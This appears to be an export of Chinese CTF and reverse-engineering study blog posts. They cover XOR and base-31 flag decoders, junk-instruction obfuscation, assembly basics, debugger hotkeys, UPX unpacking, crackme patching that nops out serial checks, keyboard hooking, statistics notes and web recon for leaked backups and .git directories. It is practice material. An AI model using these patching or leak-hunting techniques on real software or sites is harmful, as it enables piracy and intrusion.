[{"content":"一些常见的逆向函数 index() find()找索引值\n.append(ord()) +=chr()字母数字转换\n简简单单的逻辑题 1 2 3 4 5 6 ord 字符串转ascii码 chr ascii码转字符串 hex 十进制转十六进制 int(a，16) 十六进制转十进制 [起点,终点,步长] python切片 zfill(2) 为不满2个宽度的字符串前添加0直到宽度为2 easy C 直接逆完事\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \\#include \u0026lt;stdio.h\u0026gt; \\#include \u0026lt;string.h\u0026gt; int main() { char b[] = \u0026#34;d`vxbQd\u0026#34;; for (int i = 0; i \u0026lt; 7; i++) { ​ b[i] = b[i] ^ 2; ​ b[i]--; } printf(\u0026#34;%s\\n\u0026#34;, b); } 有点小难的逻辑题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 flag = \u0026#39;xxxxxxxxxxxxxxxxxxxxx\u0026#39; s = \u0026#39;wesyvbniazxchjko1973652048@$+-\u0026amp;*\u0026lt;\u0026gt;\u0026#39; result = \u0026#39;\u0026#39; for i in range(len(flag)): s1 = ord(flag[2*i]) s2 = ord(flag[2*i+1]) result += s[(s1+i)%34]+s[-(s2+i+1)%34] print(result) \\# result = \u0026#39;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i\u0026#39; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #爆破脚本，菜狗不会逆向 result = \u0026#39;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i\u0026#39; s = \u0026#39;wesyvbniazxchjko1973652048@$+-\u0026amp;*\u0026lt;\u0026gt;\u0026#39; flag = \u0026#39;\u0026#39; l=range(len(result)//2) #先找到s中的索引值 for i in l: indx1 = s.index(result[2*i]) indx2 = s.index(result[2*i+1]) for num in range(32,127): ​ s1 = num //17 ​ s2 = num % 17 ​ ds1 = (s1+i)%34 ​ ds2 = -(s2+i+1)%34 ​ if indx1 == ds1 and indx2 == ds2: ​ flag += chr(num) ​ break print(flag) 思路：其实从s到result从分析学来看，就是一个数列重排，flag被用作一个对应的函数关系式，只要一一验证result和s的值在哪个地方相等，就可以求出flag，index()就是找result中的值在s的哪个位置，这个index再经过逆向/爆破，可以得到flag\nfakerandom random.seed()：通过设置相同的随机种子，可以确保每次运行时获得相同的随机数序列\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import random flag = \u0026#39;xxxxxxxxxxxxxxxxxxxx\u0026#39; random.seed(1) l = [] for i in range(4): l.append(random.getrandbits(8)) result=[] for i in range(len(l)): random.seed(l[i]) for n in range(5): ​ result.append(ord(flag[i*5+n])^random.getrandbits(8)) print(result) \\# result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import random result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244] flag = [] random.seed(1) l = [] for i in range(4): l.append(random.getrandbits(8)) print(l) for i in range(len(l)): random.seed(l[i]) for n in range(5): ​ flag.append((chr((result[i*5+n])^random.getrandbits(8)))) flag = \u0026#39;\u0026#39;.join(flag) print(flag) 卡在签到题了\u0026hellip; if ( Str2[j] == 111 ) Str2[j] = 48; 看到有个很像flag的{hello_world},提交结果发现错了，一看伪代码，发现把0改成了o，ASCII表o对应111，0对应48\n花指令 jump\n1 2 3 4 5 6 7 8 9 10 start://花指令开始 jmp label1 DB junkcode label1: jmp label2 DB junkcode label2： jmp label3 DB junkcode label3 jnz和jz跳转\n1 2 3 4 5 6 _asm{ jz label1 jnz label1 db junkcode label1: } 永真条件跳转 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 __asm{ push ebx xor ebx,ebx test ebx,ebx jnz label1 jz label2 label1: _emit junkcode label2: pop ebx//需要恢复ebx寄存器 } __asm{ clc jnz label1: _emit junkcode label1: } call\u0026amp;ret构造花指令 1 2 3 4 5 6 7 8 9 10 11 __asm{ call label1 _emit junkcode label1: add dword ptr ss:[esp],8//具体增加多少根据调试来 ret _emit junkcode } call指令：将下一条指令地址压入栈，再跳转执行 ret指令：将保存的地址取出，跳转执行 例题\n按D转换成数据形式\n右键change bytes E8换成90 就是nop\n后面变黄的地址c修复即可\n转到函数开头p生成函数\n动态调试 可以发现有两个类：Human与Man\n在关键字处右键-\u0026gt;jump to local type，即可查看类的属性\n查看Man的本地属性，可知其继承自Human\n找到所有Human函数\n","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/nssctf%E9%80%86%E5%90%91%E9%A2%98/","title":"nssctf逆向题"},{"content":"编辑：vim/edit\n编译：masm\n链接：link\n将内存2000:0，2000:1,2000:2,2000:3单元中的数据送入al,bl,cl,dl中\n1 2 3 4 5 6 7 mov ax,2000 mov ds,ax;段地址2000h送入ds mov bx,0;偏移地址0送入bx mov al,[bx];ds:bx单元中的数据送入al 1 2 3 4 5 mov ax,2000 mov ds,ax;段地址2000h送入ds mov al,ds:[0] 比较 1 2 3 4 5 6 7 mov al,[0];将常量0送入al中 mov al,ds:[0];(al)=((ds)*16+0) mov al,ds:[bx];(al)=((ds)*16+(bx)) mov al,ds:[bx];与上面相同 循环 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 assume cs:code code segment ​ mov ax,0ffffh ​ mov ds,ax;初始化ds:bx指向ffff:0 ​ mov bx,0;初始化累加寄存器dx,(dx)=0 ​ mov cx,12;初始化循环计数寄存器 s: mov al,[bx] ​ mov ah,0 ​ add dx,ax;间接向dx中加上((ds)*16+(bx))的数值 ​ inc bx ​ loop s ​ mov ax,4c00h ​ int 21h code ends end 复制 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 assume cs:code code segment ​ mov bx,0；偏移位置从0开始 ​ mov cx,12；循环12次 s: mov ax,0fffh ​ mov ds,ax；(ds)=0ffffh ​ mov dl,[bx]；(dl)=((ds)*16+(bx))，将ffff:bx中的数据送入dl ​ mov ax,0020h ​ mov ds,ax；（ds)=0020h ​ mov [bx],dl；（(ds)*16+bx）=(dl),将dl的数据送入0020:bx ​ inc bx；偏移位置加1 ​ loop s ​ mov ax,4c00h ​ int 21h code ends end 代码段中使用栈 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 assume cs:codesg codesg segment ​ dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h ​ dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0;用dw定义16个字型数据，在程序加载后，将取得16个字的内存空间，存放16个数据，在后面的程序中将这段空间当作栈来使用 start: mov ax,cs ​ mov ss,ax ​ mov sp,30h ​ mov bx,0 ​ mov cx,8 ​ s:push cs:[bx] ​ add bx,2 ​ loop s;将代码0-15单元中的8个字型数据依次入栈 ​ mov bx,0 ​ mov cx,8 ​ s0:pop cs:[bx] ​ add bx,2 ​ loop s0;出栈8个字型数据到代码段0-15单元 ​ mov ax,4c00h ​ int 21h codesg ends end start;指明程序的入口在start处 初始状态下栈为空，所以ss:sp要指向栈底\n将数据，代码，栈放入不同的段\nQA：CPU如何知道stack放栈，data放数据？ mov ax,stack\nmov ss,ax\nmov sp,20h\n设置ss指向stack，设置ss:sp指向stack:20\n大小写转换问题 思路：大写ASCII码的第5位为0，小写字母的第5位为1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 assume cs:codesg,ds:datasg datasg segment db \u0026#39;Basic\u0026#39; db \u0026#39;iNfOrMaTiOn\u0026#39; datasg ends codesg segment start:mov ax,datasg mov ds,ax;设置ds指向daatsg mov bx,0;设置（bx）=0，ds:bx指向‘Basic’的第一个字母 mov cx,5;设置循环次数5，因为‘Basic’有5个字母 s:mov al,[bx];将ASCII码从ds:bx所指向的单元中取出 and al,11011111B;将al中的ASCII码的第5位置为0，变为大写字母 mov [bx],al;将转变后的ASCII码写回原单元 inc bx loop s mov bx,5 mov cx,11 s0:mov al,[bx] or al,00100000B;将第5位置变为1 mov [bx],al inc bx loop s0 mov ax,4c00h int 21h codesg ends end start [bx]一个内存单元\n[bx+idata]表示一个内存单元\n下面三个指令相同\nmov ax,[bx+200] mov ax,200[bx] mov ax,[bx],200 下面两个指令相同\nmov ax,[bx+si] mov ax,[bx] [si] (ax)=((ds)*16+(bx)+(si))\nidata是常量，bx,si是变量\nreg表示一个寄存器，sreg表示一个段寄存器\n关注机器指令处理的数据在什么地方\nmov bx,[0]；内存，ds:0单元\nmov bx,ax；CPU内部，ax寄存器\nmov bx,1；CPU内部，指令缓存器\n段地址（SA）和偏移地址（EA） mov ax,ds:[bp] (ax)=(ds)*16+(bp)\nSA=(ds)，EA=(bp)\nX ptr指明内存单元的长度，X再汇编指令中可以为word或byte\n例如mov word ptr ds:[0],1 指明了指令访问的内存单元是一个字单元\ndb字节型 dw字型 dd双字型数据\n如dd 100\ndup重复\ndw （重复次数） dump （数据）\n如db 3 dup (0) ,即db 0,0,0\ndb 3 dup(0,1,2),即db 0,1,2,0,1,2,0,1,2\n转移指令的原理 1 2 3 4 5 6 7 8 9 start:mov ax,0 mov bx,0 jmp short s add ax,1 s:inc REVIEW:1.从CS：IP指向内存单元读取指令，读取的指令进入指令缓冲器；2.(IP)=(IP)+所读取指令长度，从而指向下一条指令；3.执行指令，转到1，重复过程\nCS= ,IP= CS:IP指向EB 03（jump short s的机器码) 读取指令码EB 03进入指令缓冲器 IP=IP+所读取指令长度（2），指向add ax,1 CPU执行指令缓冲器中的指令EB 03（重点，如果EB 03没有对IP修改的话，应该执行add ax，1） 执行后，IP=000BH，CS:IP指向inc ax jmp word ptr 内存单元地址（段内转移）\njmp dword ptr 内存单元地址（段间转移）\njcxz相当于if((cx)==0)jump short 标号；\nloop相当于（cx)\u0026ndash;;if((cx)!=0)jump short 标号；\njump short s的转移范围是-128~127\noffset\n","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/","title":"汇编语言"},{"content":"入口E8 00 CALL ~ Add ~\nF7 步入\nF8 步出\nctrl+F9 execute till return 跳出函数\nctrl+G 移动到指定位置\nctrl+F2 重新调试\nF9 运行至断点处\nAlt + B 打开Breakpoints，列出断点\n；添加注释\nalt+M 内存模块\nctrl+E打开编辑窗口\n运行直接到断点处，步进步出逐行进行\n快速查找指定代码 从入口处不断F8直到某个函数被执行，弹窗 查找字符串检索（有个思路，可以再IDA中看函数模块的地址，再在xdbg中ctrl+G跳转到地址） 查找调用模块 在main()处打断点，记作返回点\n修改字符串\n跳转至字符串溢出区buffer（就是地址，可以用IDA先找一下），ctrl+E打开编辑窗 缺点：新字符串不能比原字符串长\n方法二： 把字符串存到缓冲区，修改PUSH处指令ctrl+E\n在原字符汇编指令处，空格键打开assemble窗口，改成”PUSH 504FF0“\n栈顶指针ESP：向栈压入数据，栈顶指针减小，向低地址移动，从栈中弹出数据时，栈顶指针增加（理解成一个无盖容器底部装了一弹簧）\n一些对于栈FILO（file in last out）的理解 在调试时，从一个函数入口处开始ESP地址减少，说明函数调用参数，把数据压入栈\ncrakeme2 F9运行后，首先调用的就是主函数\n401248处的push401E14命令来把401E14压入栈，然后40123D处CALL\u0026lt;\u0026gt;调用401232处的JMP ThunRTMain函数，会跳转到主函数ThunRTMain，前面的401E14的值作为ThunRTMain()的参数，这是一个间接调用，利用错误消息框和字符串，字符查找，往上找条件分支\n调用403329处的函数，比较函数值，再决定跳转\n栈帧 1 2 3 4 5 6 7 8 9 10 11 PUSH EBP ;函数开始 MOV EBP,ESP;保存当前ESP到EBP中 ....... ;无论ESP值如何变，EBP都保持不变 MOV ESP,EBP;将函数的起始地址返回到ESP中 POP EBP ;函数返回前弹出保存在栈中的EBP值 RETN ;函数终止 函数返回前要先从栈中删除与其对应的栈帧\n按照传递给rctMsgBox()参数的大小14清理栈\nRETN XX:根据传参的大小调整栈\nPE头 DOS头：typedef struct_IMAGE_DOS_HEADER,e_magic:DOS签名,e_ifanew:NT头偏移\nNT头：IMAGE_NT_HEADERS\nUPX upx -o 目标文件 源文件\n可以看到文件大小由67584变为48640，比ZIP压缩后大，是因为压缩后得到PE文件，需要添加PE头，并且还要放入解压缩代码\n调试notepad程序 先找到EP代码（偶然发现一个好办法，只要在开头ctrl+F8，结束后xdbg会自动暂停到入口点）EP开始时0101开头，前面都是0701开头\n在EP处ctrl+F8开始代码追踪，发现有一个短循环，在循环末尾设置断点，F9跳出循环\nUPX特征之一是,EP代码被包含在PUSHAD/POPAD指令之间，跳转到OEP代码的JMP指令紧接着出现在POPAD之后，只要在JMP指令处设置好断点，运行后就能直接找到OEP\nPE重定向原理 PE重定向就是PE文件无法加载到ImageBase所指位置，而是被加载到其他地址时发生的一系列的处理行为\n基本原理：在应用程序中查找硬编码的地址位置，读取值后，减去ImageBase(VA-RVA),加上实际加载地址（RVA-VA)\n先查找IMAGE_BASE_RELOCATION\n1 2 3 4 5 6 7 typedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; // 重定位页的 RVA DWORD SizeOfBlock; // 重定位块的大小 WORD TypeOffset; // 重定位条目的类型于偏移 } _IMAGE_BASE_RELOCATION; typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION; irtualAddress 重定位页 RVA。以映像装载基址加上页 RVA 的和作为被加数，再加上重定位项对应的 offset 就能得到其在内存中实际的 VA。最后一个重定位块的尾部也会添加一个 virtualaddress 字段作为结束标志。\nSizeOfBlock 基址重定位块的大小。包括 VirtualAddress，SizeOfBlock，以及后面 TypeOffset 的大小。\nTypeOffset 一个数组。数组中每个元素大小为 2 个字节，即 16 位。\ntype 高 4 位用于表示重定位的类型。\noffset 低 12 位用于表示重定位数据位置相对于页 RVA 的偏移量。与 VirtualAddress 相加就是要修改的重定位数据的指针，再加上映像装载基址就是修改后的指针。\n硬编码地址偏移：VirtualSize+Offset=1420(RVA)\n减去ImageBase值\n加上实际加载地址值\n从可执行文件中删除.reloc节区 前提：删除基础重定位表对运行没什么影响\n从文件偏移270开始，到297\n打开010Editor直接删除，至此,.reloc被物理删除，之后开始修改相关PE头信息（就像改配置一样）\n修改IMAGE_FILE_HEADER-NUMBER of SECTIONS，5改成4\n之后修改IMAGE_OPTIONAL_HEADER-size of image\nVirualSize时E40，Section Alignment值为1000，故要减去1000\nupack压缩后的文件 把PE文件头变形，这部分有点不太明白，大概就是增大SizeOfOptionalHeader的值，在IMAGE_OPTIONAL_HEADER和IMAGE_SECTION_HEADER之间添加额外空间，添加解码代码，如下\n从170开始是IMAGE_SECTION_HEADER\n打开section选项，观察到第一个节区和第三个节区rawoffset起始偏移都是10，由此可知Upack会对PE文件头，第一个节区，第三个节区进行重叠\n进行调试，先要找出EP入口，EP的RVA为1018，ImageBase为0100000，故EP的VA值为01001018，xdbg已经打好断点了\n（忘记保存了）\nWindows消息钩取 HookMain.exe最先加载Keyhook.dll安装键盘钩子，使用SetWindowsHookEX()安装键盘钩子，OS强制键盘输入事件，调用KeyHook.dll注入到相应进程的内存，调用KeuboardProc()函数，在ProcessExplorer中检索Keyhook.dll发现如下\n1 2 3 4 5 6 7 8 9 10 11 HHOOK SetWindowsHookEx( ​ int idHook,//hook type ​ HOOKPROC lpfn,//hook procedure ​ HINSTANCE hMod,//hook procedure所属的DLL句柄 ​ DWORD dwThreadId,//想要钩载的线程 ) ","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E9%80%86%E5%90%91%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/","title":"逆向核心原理"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 # F系列【主要是调试状态的处理】 F2 添加/删除断点 F4 运行到光标所在位置 F5 反汇编 F7 单步步入 F8 单步跳过 F9 持续运行直到输入/断点/结束 shift系列【主要是调出对应的页面】 shift+F1 Local types shift+F2 execute scripts【常用】 shift+F3 Functions shift+F4 Names shift+F5 Signatures shift+F7 Segments shift+F8 Segments registers shift+F9 Structures shift+F10 Enumerations shift+F11 Type libraries shift+F12 Strings【常用】 Shift+E 导出数据【常用】 # 单字符系列【基本是数据处理转换相关】【这些都比较常用】 G 按地址查找 D 将字符串等元素转为数据 N 重命名（函数名、变量名等） Y 修改变量类型等（比如int改char等等） H decimal 数据的进制快速转换 A 将数据转变为字符串类型 C code（将数据转变为汇编代码，分为自动和强制执行） U undefined（将字符串转变为原始数据） X 交叉引用（反汇编页面） P 选中位置识别为函数 # Ctrl、Alt系列 Ctrl+F 搜索【常用】 Ctrl+X 交叉引用（汇编页面）【常用】 Alt+T 查找Text Ctrl+T 查找下一个text Alt+C Next Code Ctrl+D Next Data Ctrl+Z 撤销 Ctrl+Shift+Z 恢复 Alt+K 修改堆栈值 # else / 添加注释 or 右键选择edit comment【常用】 \\ hide cast，隐藏/显示一些变量类型注解 Ins 添加区块注释 通用寄存器 EAX：（针对操作数和结果数据的）累加器 EBX：（DS段的数据指针）基址寄存器 ECX：（字符串和循环操作的）计数器 EDX：（I/O指针）数据寄存器 ESI：（字符串操作源指针）源变址寄存器 EDI：（字符串操作目标指针）目的变址寄存器 EBP：（SS段中栈内数据指针）扩展基址指针寄存器[栈帧寄存器、栈底指针寄存器] ESP：（SS段中栈指针）栈指针寄存器[指向栈顶] 段寄存器 CS：代码段寄存器 SS：栈段寄存器 DS：数据段寄存器 FS：数据段寄存器 ES：附加数据寄存器 GS：数据段寄存器 程序状态与控制寄存器 EFLAGS：标志寄存器，32个位元的01控制 ZF(零标志器，运算结果为0时置1) CF(进位标志，运算结果向最高位以上进位时置1) OF(溢出标志) AF(辅助进位标志，运算结果在第3位的时候置1) SF(符号标志，有符号整型的符号位为1时置1) 指令指针寄存器 EIP / RIP：保存CPU要执行的指令地址 常用指令 操作码 目的操作数 源操作数\nPUSH/POP：压栈/出栈 PUSHA/POPA 、 PUSHAD/POPAD MOV/CALL/RET/LEA/INT/EMD：传送 / 调用 / 返回 / 加载 / 中断 / 结束 CMP/TEST：比较/测试（结果丢弃，只修改标志位寄存器） JMP系列跳转指令 ADD/SUB/SHL/SHR/ROL/ROR：加 / 减 / 逻辑左移 / 逻辑右移 / 循环左移 / 循环右移 INC/DEC ：加一 / 减一 MUL/IMUL：无符号乘法、整数乘法 DIV/IDIV：无符号除法、整数除法 AND/XOR/OR/NOT：与 / 异或 / 或 / 取反 栈帧 1 2 3 4 5 6 7 8 PUSH EBP ;函数开始 MOV EBP,ESP ;将栈顶地址存入EBP中 .... ;函数执行，期间EBP地址不变 MOV ESP,EBP ;基准点地址给到ESP POP EBP ;栈状态恢复，弹出EBP RETN ;函 IDA常用脚本 IDC\u0026amp;python，具体可以看IDA的官方书籍\nIDC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 //获取寄存器的值 auto eax = GetRegValue(\u0026#34;EAX\u0026#34;); auto addr = 0x0; auto i = 0; for(i; i \u0026lt; 10; i = i+1) { //打印字节 Message(\u0026#34;%x\u0026#34;,Byte(addr+i)); //修改字节 PatchByte(addr+i,Byte()); } //dump数据 auto i,fp; fp = fopen(\u0026#34;D:\\\\dump2\u0026#34;,\u0026#34;wb\u0026#34;); for(i=0x10;i\u0026lt;0x12;i++) fputc(Byte(i),fp); print(\u0026#34;end\u0026#34;); python 1 2 3 4 5 6 7 8 # 导入头文件 from idaapi import * # 获取寄存器的值 espval = get_reg_val(\u0026#39;esp\u0026#39;) # 获取字节值ida_bytes.get_word() value = ida_bytes.get_word(address) # 获取16字节长度的数据 ida_bytes.get_bytes(address, 16) easy动态调试 思路：把不在主函数里面的函数运行下就行\nEIP修改为_ques函数的地址F9运行就行，拿到Flag\nez_xor 下面是XOR的encode函数\n一开始想了下a2是什么，发现就是传参\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char const *argv[]) { char flag1[] = \u0026#34;E`}J]OrQF[V8zV:hzpV}fVF[t\u0026#34;; char flag[] = \u0026#34;\u0026#34;; for (int i = 0; i \u0026lt; strlen(flag1); i++) { flag1[i] ^= 3 * 3; printf(\u0026#34;%s\\n\u0026#34;, flag1); } } 好无聊啊，想做PWN题了\nXOR 这道题主要是array要看懂\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \\#include \u0026lt;stdio.h\u0026gt; \\#include \u0026lt;stdlib.h\u0026gt; \\#include \u0026lt;string.h\u0026gt; int main(int argc, char const *argv[]) { int flag1[] = {0x3FE, 0x3EB, 0x3EB, 0x3FB, 0x3E4, 0x3F6, 0x3D3, 0x3D0, 0x388, 0x3CA, 0x3EF, 0x389, 0x3CB, 0x3EF, 0x3CB, 0x388, 0x3EF, 0x3D5, 0x3D9, 0x3CB, 0x3D1, 0x3CD}; char flag[] = {}; for (int i = 0; i \u0026lt; 21; i++) { ​ flag[i] = (flag1[i] - 900) ^ 0x34; ​ printf(\u0026#34;%c\u0026#34;, flag[i]); } return 0; } CrakeMEV3 意思是要读取一个同目录下名为CRACJME3.KEY的文件，试过如果文件名不叫这个，调试暂停\n看到写在CRACKME3.KEY的字符，步进查看函数\nabexcrakeme3 思路：要找一本abex.l2c文件，那就自己创建一个，下面还有两个比较跳转，直接爆破，把两个jne nop掉，秒了\ncosh1.exe 第一个爆破点：把jz换成jmp，强制跳转，不用看条件\n继续找，在函数头下断点，由于程序已经运行，直接按check for CD\n算法：就是在各种光驱里面循环查找，找有没CD_CHECK.DAT的文件\nAcid_burn 第一个serial incorrect jge改成jmp\n第二个serial jnz给nop掉\n秒了\n算法分析：看右上角寄存器，自己输入1234放在寄存器EDX中，EAX是一段字符串，猜测明文是\u0026quot;CW-4018-CRACKED\u0026quot;\n拖到IDA中分析，找CRACKED所在的函数，差不多就是下面一段\n1 2 3 4 5 6 7 8 9 void Decryption(char* mima) { char szBuff[260]; unsigned long data = (unsigned long)mima[0]; data *= 0X29; data *= 2; sprintf(szBuff, \u0026#34;CW-%d-CRACKED\u0026#34;, data); printf(\u0026#34;%s \\r\\n\u0026#34;, szBuff); } fakebase 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 flag = \u0026#39;xxxxxxxxxxxxxxxxxxx\u0026#39; s_box = \u0026#39;qwertyuiopasdfghjkzxcvb123456#$\u0026#39; tmp = \u0026#39;\u0026#39; for i in flag: tmp += str(bin(ord(i)))[2:].zfill(8) # 将每个字符转换为二进制字符串，并填充到 8 位 b1 = int(tmp,2) # 将拼接后的二进制字符串转换为十进制整数 s = \u0026#39;\u0026#39; while b1//31 != 0: s += s_box[b1%31]# 将余数映射到 s_box 中的字符，并拼接到 s 中 b1 = b1//31 print(s) \\# s = u#k4ggia61egegzjuqz12jhfspfkay 动态调试crackme 经分析，string1和string2的子串比对，进而输出判断结果，在判断结束的地方下断点，ExitProcess(0)\nXDBG调试\n要求Name输入crackme\n一步步直到出现This serial sucks，回过去看看和那个字段做了比较，要比较的字段就是正确的serial\n一般在stramp下断点\nQA:为什么在程序失败返回才能出现正确的序列号\n[SWPUCTF 2021 新生赛]fakebase 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 flag = \u0026#39;xxxxxxxxxxxxxxxxxxx\u0026#39; s_box = \u0026#39;qwertyuiopasdfghjkzxcvb123456#$\u0026#39; tmp = \u0026#39;\u0026#39; for i in flag: tmp += str(bin(ord(i)))[2:].zfill(8) b1 = int(tmp,2) s = \u0026#39;\u0026#39; while b1//31 != 0: s += s_box[b1%31] b1 = b1//31 print(s) \\# s = u#k4ggia61egegzjuqz12jhfspfkay 将flag中每个字符影射为字符集的code point, 转换为二进制, 再转换为十进制, 再转换为最低位在前的31进制,\n先把s逆回去\n1 2 3 4 5 6 7 8 9 import libnum s=\u0026#34;u#k4ggia61egegzjuqz12jhfspfkay\u0026#34;[::-1] s_box = \u0026#39;qwertyuiopasdfghjkzxcvb123456#$\u0026#39; print(s) for i in range(5): key = i for j in range((len(s))): key = key *31 + s_box.index(s[j]) print(libnum.n2s(int(key))) 看着答案，想起大一高代学的辗转相除，就是欧几里得算法\n扩展欧几里得算法可用于RSA加密等领域。\n假如需要求 1997 和 615 两个正整数的最大公约数,用欧几里得算法，是这样进行的：\n1997 ÷ 615 = 3 (余 152)\n615 ÷ 152 = 4(余7)\n152 ÷ 7 = 21(余5)\n7 ÷ 5 = 1 (余2)\n5 ÷ 2 = 2 (余1)\n2 ÷ 1 = 2 (余0)\n至此，最大公约数为1\n以除数和余数反复做除法运算，当余数为 0 时，取当前算式除数为最大公约数，所以就得出了 1997 和 615 的最大公约数 1。\n证法一 a可以表示成a = kb + r（a，b，k，r皆为正整数，且r不为0）\n假设d是a,b的一个公约数，记作d|a,d|b，即a和b都可以被d整除。\n而r = a - kb，两边同时除以d，r/d=a/d-kb/d，由等式右边可知m=r/d为整数，因此d|r\n因此d也是b,a mod b的公约数。\n因(a,b)和(b,a mod b)的公约数相等，则其最大公约数也相等，得证。\n","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E9%80%86%E5%90%91%E5%B0%8F%E7%99%BD/","title":"逆向小白"},{"content":"总体：X\n个体：Xi\n样本：(X1，X2，\u0026hellip;\u0026hellip;.Xn)随机变量\n样本值：n个独立样本的一次实现(x1,x2,\u0026hellip;\u0026hellip;.xn)具体的数\n随机抽样：无放回：近似独立同分布，n/N\u0026lt;1,放回:独立分布\n$$ proof: $$ 分层抽样：不独立\n分群抽样\n非参数统计，非参数估计，核密度估计，非参数假设检验\n非参数统计方法无需假定总体分布，可以通过样本信息来推断总体，而参数统计则需要已知或假定总体分布。因此较参数统计（即一般意义下的数理统计），非参数统计适用面更广。但非参数统计推断的准确度较低。应注意的是非参数统计只是不依赖总体分布，但有些统计量的信息还是需要知道，并且研究的对象依旧是反映总体特征的统计量。\n描述样本的中心化趋势 均值，可能会带来失帧\n中位数，样本从小到大排序的次序统计量的中间值\n众数\n变量的度量 为什么计算样本方差分母是n-1?\n极差，总体/样本方差，标准差\n分位数 百分位数，计算i=n*(p/100) 若i为整数，q(p)=(x[i]+x[i+1])/2\n若i不为整数q(p)=x[i]+1\n四分位数 Box-Whisker图 箱线图是一种基于五个数字摘要显示数据集的标准化方式：最小值、最大值、样本中位数以及第一和第三个四分位数。\nMinimum (*Q*0 or 0th percentile): the lowest data point in the data set excluding any outliers **最小值（*Q*0 或第 0 个百分位数）：**数据集中不包括任何异常值的最低数据点 Maximum (*Q*4 or 100th percentile): the highest data point in the data set excluding any outliers **最大值（*Q*4 或第 100 个百分位数）：**数据集中不包括任何异常值的最高数据点 Median (*Q*2 or 50th percentile): the middle value in the data set **中位数（*Q*2 或第 50 个百分位数）：**数据集中的中间值 First quartile (*Q*1 or 25th percentile): also known as the lower quartile q**n(0.25), it is the median of the lower half of the dataset. 第一四分位数（*Q*1 或第 25 个百分位数）：也称为*下四分位数qn*（0.25），它是数据集下半部分的中位数。 Third quartile (*Q*3 or 75th percentile): also known as the upper quartile q**n(0.75), it is the median of the upper half of the dataset.[7] 第三个四分位数（*Q*3 或第 75 个百分位数）：也称为*上四分位数qn*（0.75），它是数据集上半部分的中位数。[7] 数据分析推断前期：可视化！\n","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/","title":"数理统计"},{"content":"web2：view-source是一种协议，早期基本上每个浏览器都支持这个协议。后来Microsoft考虑安全性，对于WindowsXP pack2以及更高版本以后IE就不再支持此协议。但是这个方法在FireFox和Chrome浏览器都还可以使用。 如果要在IE下查看源代码,只能使用查看中的\u0026quot;查看源代码\u0026quot;命令.以前的使用方法：在浏览器地址栏中输入 view-source: URL\nweb3:打开burp suite然后在仪表盘选择新扫描输入url（网址）后点击确定，然后点击目标，选择相应\u0026ndash;raw就可以看见flag了or F12 \u0026mdash;\u0026gt;选择网络\u0026mdash;\u0026gt;F5刷新页面，查看响应头。\nweb4：robots.txt（爬虫协议）\nweb5：目录扫描：index.phps(php文件)\nphps文件泄露，phps存放着php源码,可通过尝试访问/index.phps读取,或者尝试扫描工具扫描读取.\nweb6：url/www.zip网站备份压缩文件 漏洞成因\n在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。\n当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。\n该漏洞的成因主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。\n该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。\n被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。\n.rar .zip .7z .tar.gz .bak .swp .txt\n源码泄露 url/www.zip 得知隐藏目录/fl000g.txt\nweb7: dirsearch -u url 发现目录 /.git\nweb8 /.svn 